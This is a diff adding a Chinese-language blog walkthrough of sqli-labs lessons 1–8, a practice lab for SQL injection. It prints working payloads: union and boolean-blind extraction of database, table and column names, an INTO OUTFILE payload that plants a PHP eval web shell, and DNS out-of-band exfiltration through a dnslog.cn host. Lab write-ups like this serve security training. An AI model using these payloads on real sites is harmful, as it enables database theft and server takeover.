@@ -257,7 +257,7 @@ var _hmt = _hmt || [];
 
 <div id="article-content">
 	<h2 id="SQL-Injections-Page-1">SQL Injections Page 1</h2>
-<h3 id="Error-based-Single-quotes-String-Less-1">Error based - Single quotes -String Less-1</h3>
+<h3 id="Get-Error-based-Single-quotes-String-Less-1">Get - Error based - Single quotes - String Less-1</h3>
 <p>此注入为单引号报错注入，需要闭合引号<code>'</code>=<code>%27</code></p>
 <pre><code class="highlight mysql">sqli-labs/Less-1/?id=1%27 and 1=1 -- -   #正常显示
 sqli-labs/Less-1/?id=1%27 and 1=2 -- -   #无返回结果</code></pre>
@@ -280,6 +280,147 @@ sqli-labs/Less-1/?id=1%27 and 1=2 -- -   #无返回结果</code></pre>
 <pre><code class="highlight mysql">?id=-1%27 union select 1,database(),version() -- -</code></pre>
 <p><img src="https://s1.imagehub.cc/images/2021/10/02/imagef6ec6c193860368c.png" alt="imagef6ec6c193860368c.png"></p>
 <center>【less-1-2】</center>
+<p>至于后面的操作就不赘述了</p>
+<h3 id="Get-Error-based-intiger-based-Less-2">Get - Error based - intiger based  Less-2</h3>
+<p>此注入为整数型注入，不需要闭合</p>
+<p>此注入和less-1注入是大同小异，只是不需要加<code>'</code>罢了，剩下的操作一致</p>
+<pre><code class="highlight php"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>; <span class="comment">#可以看出id=后面是没有引号的</span></code></pre>
+<pre><code class="highlight mysql">?id=1 and 1=1 #不报错
+?id=1 and 1=2 #不显示正确数据，存在注入且注入为整数型注入</code></pre>
+<p>接下来就是一样的了</p>
+<h3 id="Get-Error-based-Single-quotes-with-twist-String">Get - Error based - Single quotes with twist - String</h3>
+<p>此注入为带括号的单引号注入，需要闭合，php代码如下：</p>
+<pre><code class="highlight php"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>; <span class="comment">#可以里看出这次在id=后面添加了括号，所以闭合时也需要 </span></code></pre>
+<p>这个注入总体和前面的是一致的，只是需要在构造的payload上添加<code>)</code>闭合</p>
+<pre><code class="highlight php"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>; <span class="comment">#如果只是添加&#x27;，不添加 ) 闭合就会报错，如下</span>
+<span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;1%27 and 1=2 -- - &#x27;) LIMIT 0,1&quot;</span>; <span class="comment">#报错，所以就需要在payload上添加括号，如下：</span>
+payload：?id=<span class="number">1</span>%<span class="number">27</span>) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span>
+<span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;1%27) and 1=2 -- - &#x27;) LIMIT 0,1&quot;</span>; <span class="comment">#这样就是正确的</span></code></pre>
+<p>接下来的爆显位，爆数据库名，表名，字段名如法炮制</p>
+<h3 id="Get-Error-based-Double-quotes-String-Less-4">Get - Error based - Double quotes - String Less-4</h3>
+<p>此注入为双引号字符型注入，需要闭合，和Less-1的区别就是将<code>'</code>换成<code>&quot;</code>，同时需要加<code>)</code>闭合即可，其他一致，只是看一下php源码如下：</p>
+<pre><code class="highlight php"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;
+<span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</code></pre>
+<p>这是看源码出来的，但很多时候属于黑盒测试，是无法看到源码的，所以可以多试试不同的情况</p>
+<h3 id="Get-Double-Injection-Single-quotes-String-Less-5">Get -  Double Injection - Single quotes - String Less-5</h3>
+<p>次注入为单引号双注入，就是需要使用单引号，和布尔盲注同时进行</p>
+<p>布尔盲注使用场景就是在不提供显位的情况下使用，他不像前面几个会提供显位，存在布尔盲注的页面基本是根据true和false的切换来判断是否存在，如果true是正常页面，false是缺失页面即可存在布尔注入，我们可以看源码就可以更好理解：</p>
+<pre><code class="highlight php"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;
+<span class="comment">#这里对id进行payload构造，可以如下：</span>
+<span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;1%27 and length(database())=8 -- -&#x27; LIMIT 0,1&quot;</span>;
+<span class="comment">#这里的%27代替`&#x27;`，这个sql语句就是如果数据库的名字长度为8就是true，不为8就是false，这和前面的and 1=1 and 1=2是一样的原理</span>
+<span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);
+<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);
+
+	<span class="keyword">if</span>(<span class="variable">$row</span>)<span class="comment">#这里只是判断了是否有结果，如果有就显&#123;&#125;里面的页面，如果没有就显示else的内容</span>
+	&#123;
+  	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	
+  	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;
+  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;
+    	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;
+  	&#125;
+	<span class="keyword">else</span> 
+	&#123;
+	
+	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;
+	print_r(mysql_error());
+	<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;	
+	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	
+	
+	&#125;
+&#125;</code></pre>
+<p>但很多时候布尔盲注和其他注入情况是可以共存的，一般能不用布尔盲注的就不要用</p>
+<p>下面是具体手法，后面在遇到类似将简写：</p>
+<p>判断是否存在布尔盲注</p>
+<pre><code class="highlight mysql">?id=1%27 and 1=1 #正常
+?id=1%27 and 1=2 #报错
+#存在注入，但是这个没有显位，所以就只能使用布尔盲注，我们可以将and后的条件成立情况换成我们需要的内容比如数据库长度，需要啥就换成对应的就可以了</code></pre>
+<p>接下来猜解数据库名</p>
+<pre><code class="highlight mysql">?id=1%27 and length(database())=8 -- - #正常
+?id=1%27 and length(database())=7 -- - #报错，说明数据库名长度为8个字符
+
+?id=1%27 and substr(database(),1,1)=&#x27;a&#x27; -- - #报错，说明第一个字母不是a
+?id=1%27 and substr(database(),1,1)=&#x27;s&#x27; -- - #不报错，说明第一个字母是s
+?id=1%27 and substr(database(),2,1)=&#x27;e&#x27; -- - #不报错，说明第一个字母是e
+
+#以此类推可以得出数据库名</code></pre>
+<p>得到数据库名后就是表名</p>
+<pre><code class="highlight mysql">?id=1%27 and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=5) #报错
+?id=1%27 and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6) #不报错，说明第一个表的表名字符数为6
+
+?id=1%27 and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;e&#x27; #不报错，说明第一个字母为e，其余类推</code></pre>
+<p>得到表名后的字段名</p>
+<pre><code class="highlight mysql">?id=1%27 and (length((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1))=5) #报错
+?id=1%27 and (length((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1))=6) #不报错，说明第一个字段的字段名字符数为6
+
+?id=1%27 and substr((select column_name from information_schema.tables where table_name=&quot;users&quot; limit 0,1),1,1)=&#x27;i&#x27; #不报错，说明第一个字母为e，其余类推
+
+#如果需要查询users表中的第二个字段只需要将limit 0,1改成limit 1,1
+</code></pre>
+<p>通过以上方法循环就可以得出内容和相应的数据</p>
+<blockquote>
+<p>以上方法虽然可以使用二分法对其进行简化判断次数（sqlmap盲注就是使用的二分法），但是总的来说还是太过于麻烦了，所以这时有前辈就想出了使用dnslog来获取盲注结果，当然也可以使用Apache日志来查询结果，使用外带数据注入的话需要secure_file_priv＝，否则不成功</p>
+</blockquote>
+<h3 id="Get-Double-Injection-Double-quotes-String-Less-6">Get - Double Injection - Double quotes - String Less-6</h3>
+<p>此注入是双引号加布尔注入，其实总体思路就是和前面的Less-5差不多，只是将单引号改成双引号，这里就不多说了，略过</p>
+<h3 id="Get-Dump-into-outfile-String-Less-7">Get - Dump into outfile - String Less-7</h3>
+<p>这个主要是考的文件导出，一般可以配合load_file()一起使用，也可以单独使用，</p>
+<p>有以下三个前提：</p>
+<blockquote>
+<p>root权限</p>
+<p>知道绝对路径</p>
+<p>secure_file_priv不是null或者’'，如果是tmp的话就必须写入到tmp里面去</p>
+</blockquote>
+<p>因为当前less-7是无法通过报错知道路劲的，但是在其他真实网站中是可以通过一系列手段爆出物理路径的</p>
+<p>这个需要使用联合查询union</p>
+<p>构造payload 如下：</p>
+<pre><code class="highlight mysql">1%27)) union select 1,2,3,&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#x27; into outfile &quot;C://phpstudy_pro//WWW//sqli-labs//1.php&quot; -- + #至于这里为什么要使用1%27))我们看源码可知需要如此构造，至于怎么找到有多少个查询字段的就不累述了，前面都有</code></pre>
+<p>源码如下：</p>
+<pre><code class="highlight php"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;
+<span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);
+<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);
+
+	<span class="keyword">if</span>(<span class="variable">$row</span>)
+	&#123;
+  	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;	
+  	<span class="keyword">echo</span> <span class="string">&#x27;You are in.... Use outfile......&#x27;</span>;
+  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;
+  	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;
+  	&#125;
+	<span class="keyword">else</span> 
+	&#123;
+	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;
+	<span class="keyword">echo</span> <span class="string">&#x27;You have an error in your SQL syntax&#x27;</span>;
+	<span class="comment">//print_r(mysql_error());</span>
+	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  
+	&#125;
+&#125;</code></pre>
+<h3 id="Get-Blind-Boolean-Based-String-Quotes-Less-8">Get - Blind - Boolean Based -String Quotes Less-8</h3>
+<p>这个注入是一个布尔盲注双引号闭合的，盲注我们在less-5就提过一嘴，且基本的注入流程差不多，验证流程也是一直的，但是这次我们使用dnslog来快速获取信息，但这个的话有一个前提是load_file()函数没有被禁用，因为我们需要用到此函数</p>
+<p>dns网站有常用的两个，如下：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://dnslog.cn">http://dnslog.cn</a></p>
+<p><a target="_blank" rel="noopener" href="http://ceye.io">http://ceye.io</a></p>
+</blockquote>
+<p>个人推荐使用dnslog，方便快捷，当然现在也有开源的dnslog可以自行搭建</p>
+<p>dnslog网址获得如图Less-8-1</p>
+<p><a target="_blank" rel="noopener" href="https://www.imagehub.cc/image/80zl7"><img src="https://s1.imagehub.cc/images/2021/10/03/image.png" alt="image.png"></a></p>
+<center>【Less-8-1】</center>
+<p>然后就可以构造payload了，如下：</p>
+<pre><code class="highlight mysql">?id=1%27 and (load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.bkvbfs.dnslog.cn\\abc&#x27;))) -- - #这样就可以了</code></pre>
+<p>效果如下Less-8-2</p>
+<p><a target="_blank" rel="noopener" href="https://www.imagehub.cc/image/80gd6"><img src="https://s1.imagehub.cc/images/2021/10/03/imageb872f21e0a3a639e.png" alt="imageb872f21e0a3a639e.png"></a></p>
+<center>【Less-8-2】</center>
+<p>接下来的就只需要构造concat里面的第二个参数就可以了，但是由于用户名或者其他信息容易出现特殊字符，所以一般进行十六进制转换，payload如下：</p>
+<pre><code class="highlight mysql">?id=1%27 and (load_file(concat(&#x27;\\\\&#x27;,(select hex(database())),&#x27;.bkvbfs.dnslog.cn\\abc&#x27;))) -- - #对其进行编码出来的是这样的</code></pre>
+<p>如图Less-8-3</p>
+<p><a target="_blank" rel="noopener" href="https://www.imagehub.cc/image/808G1"><img src="https://s1.imagehub.cc/images/2021/10/03/imagec195c22e6591bd03.png" alt="imagec195c22e6591bd03.png"></a></p>
+<center>【Less-8-3】</center>
+<p>剩下的就和普通的查询没啥区别了，也就不掩饰了</p>
+<blockquote>
+<p>DNSlog只在windows服务器上有效，如果服务器是Linux就无法使用dnslog来获取数据</p>
+<p>至于为什么要使用四个\，这个是uac规定的，两个\为一个\</p>
+</blockquote>
 
 </div>
 
